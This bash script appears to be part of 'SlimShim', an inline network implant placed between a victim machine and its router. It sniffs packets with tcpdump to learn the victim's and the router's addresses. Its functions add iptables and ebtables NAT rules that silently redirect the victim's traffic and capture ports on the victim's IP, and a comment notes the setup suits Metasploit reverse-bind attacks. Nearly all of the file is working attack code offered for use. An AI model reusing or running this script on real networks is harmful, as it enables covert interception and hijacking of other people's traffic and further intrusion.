#!/bin/bash
# 20160703 Kirby

################################################################################
# LICENSE
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
################################################################################

which tcpdump awk sed cut grep >/dev/null 2>&1
if [ $? != 0 ]; then
    echo "# FAIL: you must install the following: tcpdump awk sed cut"
    exit 1
fi


function slimguess() {
    local valid=0
    while [ $valid == 0 ]; do
        tcpdumpcmd="tcpdump -c1 -e -nni br-lan src portrange 32768-65535 and not ether src 00:01:01:01:01:01 and not ether src ff:ff:ff:ff:ff:ff and not ether dst ff:ff:ff:ff:ff:ff and not port 68 and not port 67 and not port 137 and not port 139 and not ip6 and (tcp or udp) and not net 224.0.0.0/4 and not net 169.254.0.0/16"
        sniff=$($tcpdumpcmd 2>/dev/null)
        echo "#"
        echo "# PACKET: $sniff"
        echo "#"
        ip=$(echo $sniff |sed -e 's/.* \([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\)\.[0-9]* > .*/\1/')
        mac=$(echo $sniff |awk '{print $2}')
        netguess="${ip%.*}.0"
        tcpdumpcmd="tcpdump -c1 -e -nni br-lan not ip6 and (tcp or udp) and src host $ip and not dst net $netguess/24 and src portrange 32768-65535 and not ether src 00:01:01:01:01:01 and not ether src ff:ff:ff:ff:ff:ff and not ether dst ff:ff:ff:ff:ff:ff and not port 68 and not port 67 and not net 224.0.0.0/4 and not net 169.254.0.0/16"
        sniff=$($tcpdumpcmd 2>/dev/null)
        routermac=$(echo $sniff |awk '{print $4}' |cut -d',' -f1)
        echo "#"
        echo "# PACKET: $sniff"
        echo "#"
        echo "routermac=$routermac"
        echo "mac=$mac"
        echo "ip=$ip"

        if [ "$ip" == "0.0.0.0" ] || [ "$mac" == "ff:ff:ff:ff:ff:ff" ] || [ "$mac" == "$routermac" ] || [ "$routermac" == "ff:ff:ff:ff:ff:ff" ] || [ "$mac" == "00:01:01:01:01:01" ] || [ "$routermac" == "00:01:01:01:01:01" ] || [ "${ip%.*.*}" == "169.254" ]
        then
            echo "############################################"
            echo "# BAD DATA"
            echo "# $sniff"
            echo "############################################"
        else
            valid=1
        fi
    done


    echo "# Getting routerip."
    echo "# Wait until victim arp queries the router mac"
    echo "#      OR unplug and replug ethernet (to victim) to run quicker"
    local valid=0
    while [ $valid == 0 ]; do
        led='/sys/class/leds/nexx:blue:power/brightness'
        if [ -f $led ]; then
            touch /tmp/blink
            blinkled $led & 
        fi
        
        # On some devices you can run ip link dev down/up to simulate the unplug, but it will break on OpenWRT/LEDE
        grep -q Kali /etc/os-release
        if [ $? == 0 ]; then
            echo "# Turning off/on interfaces to speed this up"
            echo "# Disable this in the script if your device becomes unresponsive"
            ip link set dev eth0 down
            ip link set dev eth0 up
            ip link set dev eth1 down
            ip link set dev eth1 up
        fi

        sniff=$(tcpdump -c1 -nni br-lan ether src $routermac and ether dst $mac and arp 2>/dev/null)
        # 21:33:32.482541 ARP, Reply 192.168.1.1 is-at 68:05:ca:32:5e:85, length 46
        routerip=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
        if [ "$routerip" == "0.0.0.0" ] || [ "$routerip" == "$ip" ] || [ "${ip%.*.*}" == "169.254" ]
        then
            echo "############################################"
            echo "# BAD DATA"
            echo "# $sniff"
            echo "############################################"
        else
            echo "#"
            echo "# PACKET: $sniff"
            echo "#"
            valid=1
        fi
    done
    if [ -f $led ]; then
        rm /tmp/blink
        echo 0 > $led
    fi
    echo "routerip=$routerip"

}

function blinkled() {
    local ledfile=$1
    while [ -f /tmp/blink ]; do
        echo 1 > $ledfile
        sleep 1
        echo 0 > $ledfile
        sleep 2
    done
}

function shimredirect() {
# redirect outbound traffic from victim($sip) to destination($dip)
    local proto=$1
    local sip=$2
    local dip1=$3
    local dip2=$4
    local port=$5
    iptables -t nat -A PREROUTING -s $sip -d $dip1 -p $proto -m $proto --dport $port -j DNAT --to-destination $dip2:$port
}

function shimrdrport() {
# redirect traffic going to victim IP($sip) on $rdrport to the SlimShim on $dstport
    local proto=$1
    local sip=$2
    local rdrport=$3
    local dstport=$4
    local myip=$5
    local mymac=$6
    myip="${myip:-169.254.0.1}"
    mymac="${mymac:-0:1:1:1:1:1}"

    ebtables -t nat -A PREROUTING -p 0x800 --ip-proto $proto --ip-destination $sip --ip-destination-port=$rdrport -j dnat --to-destination $mymac
    iptables -t nat -A PREROUTING ! -s $myip -d $sip -p $proto -m $proto --dport $rdrport -j DNAT --to-destination $myip:$dstport
}

function shimrdrports() {
# redirct multiple ports(begin:end) to SlimShim.  Useful for reverse-bind attacks in Metasploit
    local proto=$1
    local sip=$2
    local rdrports=$3
    local myip=$5
    local mymac=$6
    myip="${myip:-169.254.0.1}"
    mymac="${mymac:-0:1:1:1:1:1}"

    ebtables -t nat -A PREROUTING -p 0x800 --ip-proto $proto --ip-destination $sip --ip-destination-port=$rdrports -j dnat --to-destination $mymac
    iptables -t nat -A PREROUTING ! -s $myip -d $sip -p $proto -m $proto -m multiport --dports $rdrports -j DNAT --to-destination $myip
}
